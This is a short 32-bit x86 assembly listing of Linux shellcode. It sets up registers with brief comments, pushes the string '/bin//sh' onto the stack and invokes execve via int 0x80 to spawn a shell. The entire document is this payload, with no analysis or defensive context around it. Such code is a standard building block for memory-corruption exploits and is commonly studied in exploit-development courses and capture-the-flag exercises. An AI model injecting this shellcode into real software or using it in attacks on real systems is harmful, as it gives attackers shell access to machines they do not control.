BITS 32
  ; execve
  ; eax: 11
  ; ebx: pointer to shell
  ; ecx/edx: NULL
  xor ecx, ecx
  push BYTE 11
  pop eax
  cdq
  push ecx
  push 0x68732f2f
  push 0x6e69622f
  mov ebx, esp
  int 0x80
